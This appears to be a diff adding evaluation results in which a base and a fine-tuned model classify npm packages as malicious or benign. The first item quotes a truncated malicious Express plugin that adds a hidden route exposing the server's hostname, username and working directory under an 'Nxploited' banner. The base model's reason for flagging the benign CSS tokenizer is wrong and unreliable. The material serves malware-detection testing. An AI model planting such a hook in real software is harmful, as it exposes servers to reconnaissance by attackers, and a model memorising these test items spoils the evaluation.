@@ -1,0 +1,12 @@
+{
+ "malicious:ep_nxs14622_1.0.0.tgz": {
+  "prompt_head": "FILES (3):\nep.json (107 B)\nindex.js (494 B)\npackage.json (113 B)\n\n=== package.json (name/version/description removed) ===\n{\n \"main\": \"index.js\"\n}\n\n=== index.js ===\n'use strict';\nvar os=require('os');\nexports.expressPreSession=function(h,ctx){var app=[host];app.get('/Nx_14622/',function(q,r){var i={host:os.hostname(),user:os.userInfo().username,platform:os.platform(),node:process.version,cwd:process.cwd(),pid:process.pid};r.type('text/html').send('<html><body style=\"background:#111;color:#0f0;font:14px monospace;padding:20px\"><h2 style=\"color:#f00;text-align:center\">Nxploited | Nx-zD</h2><pre>",
+  "base": "{\n  \"isMalicious\": true,\n  \"reason\": \"The package contains a potentially dangerous function `expressPreSession` that can be exploited to execute arbitrary code on the server. The function sends a malicious HTML page containing a JSON payload with sensitive information, including the server's hostname, user, platform, node version, current working directory, and process ID. This can be used to perform",
+  "tuned": "{\"verdict\": \"malicious\"}"
+ },
+ "benign:_csstools_css-tokenizer_4.0.3.tgz": {
+  "prompt_head": "FILES (6):\nCHANGELOG.md (217 B)\nLICENSE.md (1111 B)\nREADME.md (2474 B)\ndist/index.d.ts (17907 B)\ndist/index.mjs (18312 B)\npackage.json (1089 B)\n\n=== package.json (name/version/description removed) ===\n{\n \"scripts\": {},\n \"exports\": {\n  \".\": {\n   \"types\": \"./dist/index.d.ts\",\n   \"default\": \"./dist/index.mjs\"\n  }\n },\n \"engines\": {\n  \"node\": \">=20.19.0\"\n }\n}\n\n=== dist/index.mjs ===\nclass ParseError extends Error{sourceStart;sourceEnd;parserState;constructor(e,n,t,o){super(e),this.name=\"ParseError\",this.sourceStart=n,this.sourceEnd=t,this.parserState=o}}class ParseErrorWithToken extends ParseError{",
+  "base": "{\n  \"isMalicious\": true,\n  \"reason\": \"The package contains a class `ParseError` with methods that could be used for error injection, and the file `dist/index.mjs` contains potentially dangerous code (e.g., `isHexDigitCodePoint`, `isIdentStartCodePoint`, etc.) that may be used for code injection or other malicious purposes.\"\n}",
+  "tuned": "{\"verdict\": \"benign\"}"
+ }
+}
